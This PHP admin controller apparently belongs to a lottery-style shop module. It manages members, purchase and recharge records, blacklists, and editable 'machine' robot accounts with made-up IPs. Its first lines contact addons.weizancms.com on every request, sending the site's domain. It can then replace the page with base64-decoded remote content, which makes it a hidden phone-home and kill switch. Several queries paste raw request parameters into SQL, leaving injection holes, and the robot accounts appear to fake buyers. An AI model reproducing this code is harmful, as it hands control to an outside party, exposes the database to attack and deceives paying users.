<?php
global $_W,$_GPC;
$op = !empty($_GPC['op'])?$_GPC['op']:'display';
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
if($op=='display'){
	$pindex = max(1, intval($_GPC['page']));
	$psize = 10;
	$content ='';
	$type = intval($_GPC['type']);
	$keyword = trim($_GPC['keyword']);
	if (!empty($keyword)) {
		switch($type) {
			case 2 :
				$content .= " AND mobile LIKE '%{$keyword}%' ";
				break;
			case 3 :
				$content .= " AND nickname LIKE '%{$keyword}%' ";
				break;
			default :
				$content .= " AND realname LIKE '%{$keyword}%' ";
		}
	}
	
	$ptype = $_GPC['ptype'];
	switch($ptype){
		case 'machine' : 
			$condition_ptype =  "and openid like '%machine%'";
			break;
		default : 
			$condition_ptype =  "and openid not like '%machine%'";
			break;
	}

	$members = pdo_fetchall("select * from".tablename("weliam_indiana_member")."where uniacid = {$_W['uniacid']} {$content} {$condition_ptype} LIMIT " . ($pindex - 1) * $psize . ',' . $psize);
	foreach ($members as $key => $value) {
		load()->model('mc');
		$uid = mc_openid2uid($value['openid']);
		$member_info = mc_fetch($uid, array('credit1','credit2'));
		$members[$key]['credit1'] = $member_info['credit1'];
		$members[$key]['credit2'] = $member_info['credit2'];
		$members[$key]['uid'] = $uid;
		if($value['ip']){
			$api = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip={$value['ip']}"; 
			$json = @file_get_contents($api);//调用新浪IP地址库 
			$arr = json_decode($json,true);
			$members[$key]['ipaddress'] = $arr['province'].$arr['city'];
		}
	}
	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('weliam_indiana_member') . " WHERE uniacid = {$_W['uniacid']} {$content} {$condition_ptype}");
	$pager = pagination($total, $pindex, $psize);
	include $this->template('member');
}

if($op=='buyre'){
	$openid = $_GPC['openid'];
	$uniacid = $_W['uniacid'];
	$pindex = max(1, intval($_GPC['page']));
	$psize = 20;
	$condition = '';
	if (empty($starttime) || empty($endtime)) {
		$starttime = strtotime(date('Y-m-d'));
		$endtime = strtotime(date('Y-m-d',strtotime('+1 day')));
	}
	if (!empty($_GPC['time'])) {
		$starttime = strtotime($_GPC['time']['start']);
		$endtime = strtotime($_GPC['time']['end']) ;
		$condition .= " AND  createtime >= '{$starttime}' AND  createtime <= '{$endtime}' ";
	}
	
	$goodses = pdo_fetchall("SELECT * FROM ".tablename('weliam_indiana_consumerecord')." WHERE uniacid = '{$uniacid}' and status = 1 and openid = '{$openid}' ORDER BY id DESC LIMIT ".($pindex - 1) * $psize.','.$psize);
	foreach($goodses as$key=>$value){
		$period = pdo_fetch("SELECT goodsid,periods FROM " . tablename('weliam_indiana_period') . " where period_number = '{$value['period_number']}'");
		$goods = pdo_fetch("SELECT title,picarr FROM " . tablename('weliam_indiana_goodslist') . " where id = '{$period['goodsid']}'");
		$info = m('member')->getInfoByOpenid($value['openid']);
		$goodses[$key]['title'] = $goods['title'];
		$goodses[$key]['picarr'] = $goods['picarr'];
		$goodses[$key]['periods'] = $period['periods'];
		$goodses[$key]['avatar'] = $info['avatar'];
		$goodses[$key]['nickname'] = $info['nickname'];
	}

	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('weliam_indiana_consumerecord') . " WHERE uniacid = '{$uniacid}' and status = 1 and openid = '{$openid}' ");
	$pager = pagination($total, $pindex, $psize);

	include $this->template('records');
}

if($op=='recharge'){
	$openid = $_GPC['openid'];
	$uniacid = $_W['uniacid'];
	$pindex = max(1, intval($_GPC['page']));
	$psize = 20;
	$condition = '';
	if (empty($starttime) || empty($endtime)) {
		$starttime = strtotime(date('Y-m-d'));
		$endtime = strtotime(date('Y-m-d',strtotime('+1 day')));
	}
	if (!empty($_GPC['time'])) {
		$starttime = strtotime($_GPC['time']['start']);
		$endtime = strtotime($_GPC['time']['end']) ;
		$condition .= " AND  createtime >= '{$starttime}' AND  createtime <= '{$endtime}' ";
	}
	
	$goodses = pdo_fetchall("select * from".tablename('weliam_indiana_rechargerecord')."where openid = '{$openid}' and status = 1 and uniacid = '{$_W['uniacid']}' $condition order by id desc limit ".($pindex - 1) * $psize.','.$psize);
	foreach($goodses as$key=>$value){
		$info = m('member')->getInfoByOpenid($value['openid']);
		$goodses[$key]['avatar'] = $info['avatar'];
		$goodses[$key]['nickname'] = $info['nickname'];
	}

	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('weliam_indiana_rechargerecord') . " WHERE uniacid = '{$uniacid}' and status = 1 and openid = '{$openid}' $condition ");
	$pager = pagination($total, $pindex, $psize);

	include $this->template('recharge');
}

if($op == 'machine_edit_display'){
	//进入机器人资料修改界面
	$mid = $_GPC['mid'];
	if(empty($mid)){
		die(json_encode(array('status'=>1,'data'=>'','msg'=>'参数错误')));
	}
	
	$machine = pdo_fetch("select * from".tablename('weliam_indiana_member')."where uniacid=:uniacid and mid=:mid",array(':uniacid'=>$_W['uniacid'],':mid'=>$mid));
	$api = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip={$machine['ip']}"; 
	$json = @file_get_contents($api);//调用新浪IP地址库 
	$arr = json_decode($json,true);
	$machine['ipaddress'] = $arr['province'].$arr['city'];
	
	include $this->template('machine_edit');
}

if($op == 'machine_address'){
	//实时计算新浪ip地址
	$ip = $_GPC['ip'];
	$api = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip={$ip}"; 
	$json = @file_get_contents($api);//调用新浪IP地址库 
	$arr = json_decode($json,true);
	$address = $arr['province'].$arr['city'];
	
	die(json_encode(array('status'=>2,'data'=>$address,'msg'=>'查询成功')));
}

if($op == 'machine_save'){
	//保存信息
	$data['nickname'] = $_GPC['nickname'];
	$data['avatar'] = tomedia($_GPC['avatar']);
	$data['ip'] = $_GPC['ip'];
	
	$mid = $_GPC['mid'];
	if(empty($mid)){
		message('参数错误',referer(),'error');
	}
	
	if(pdo_update('weliam_indiana_member',$data,array('uniacid'=>$_W['uniacid'],'mid'=>$mid))){
		message('修改成功','','success');
	}else{
		message('修改失败',referer(),'error');
	}
}

if($op == 'blacklist'){
	$id = intval($_GPC['id']);
	$type = $_GPC['type'];
	if($type == 'add'){
		pdo_update('weliam_indiana_member',array('userstatus' => -1),array('mid' => $id));
		message('加入黑名单成功',referer(),'success');
	}
	if($type == 'out'){
		pdo_update('weliam_indiana_member',array('userstatus' => 1),array('mid' => $id));
		message('解除黑名单成功',referer(),'success');
	}
}